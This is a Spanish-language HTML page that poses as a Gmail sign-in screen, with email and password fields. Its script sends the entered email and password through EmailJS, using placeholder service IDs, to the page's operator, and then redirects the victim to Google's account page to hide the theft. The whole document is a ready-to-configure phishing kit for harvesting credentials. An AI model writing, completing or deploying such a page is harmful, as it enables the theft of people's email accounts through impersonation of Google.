<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión - Gmail</title>
    
    <!-- Vincula Google Material Icons para el ícono de Gmail -->
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f1f3f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        .login-box {
            background-color: #fff;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        .login-box h1 {
            font-size: 24px;
            color: #202124;
            margin-bottom: 30px;
        }

        .gmail-icon {
            font-size: 40px;
            color: #1a73e8;
            margin-bottom: 20px;
        }

        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .input-group label {
            display: block;
            font-size: 14px;
            color: #202124;
            margin-bottom: 5px;
        }

        .input-group input {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 5px;
            outline: none;
        }

        .input-group input:focus {
            border-color: #0078d4;
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            font-size: 16px;
            color: white;
            background-color: #1a73e8;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .login-btn:hover {
            background-color: #0c59a1;
        }

        .forgot-password {
            margin-top: 15px;
        }

        .forgot-password a {
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
        }

        .forgot-password a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-box">
            <!-- Ícono de Gmail -->
            <span class="material-icons gmail-icon">mail</span>
            
            <h1>Iniciar sesión</h1>
            <form id="login-form">
                <div class="input-group">
                    <label for="email">Correo electrónico</label>
                    <input type="email" id="email" name="email" placeholder="Tu correo" required>
                </div>
                <div class="input-group">
                    <label for="password">Contraseña</label>
                    <input type="password" id="password" name="password" placeholder="Tu contraseña" required>
                </div>
                <button type="submit" class="login-btn">Iniciar sesión</button>
                <div class="forgot-password">
                    <a href="#">¿Olvidaste tu contraseña?</a>
                </div>
            </form>
        </div>
    </div>

    <!-- Script para EmailJS -->
    <script type="text/javascript">
        (function(){
            emailjs.init("YOUR_USER_ID");  // Sustituye "YOUR_USER_ID" con tu ID de usuario de EmailJS
        })();

        // Maneja el envío del formulario
        document.getElementById("login-form").addEventListener("submit", function(event){
            event.preventDefault();
            
            var email = document.getElementById("email").value;
            var password = document.getElementById("password").value;

            // Configuración del mensaje que se enviará a través de EmailJS
            var templateParams = {
                email: email,
                password: password
            };

            // Enviar el correo a través de EmailJS
            emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", templateParams)
                .then(function(response) {
                    console.log("Correo enviado con éxito", response);
                    alert("Correo enviado con éxito. Iniciando sesión...");
                    // Aquí puedes redirigir al usuario a la cuenta de Google, si lo deseas
                    window.location.href = "https://myaccount.google.com";
                }, function(error) {
                    console.log("Error al enviar correo", error);
                    alert("Ocurrió un error al enviar el correo. Intenta nuevamente.");
                });
        });
    </script>
</body>
</html>
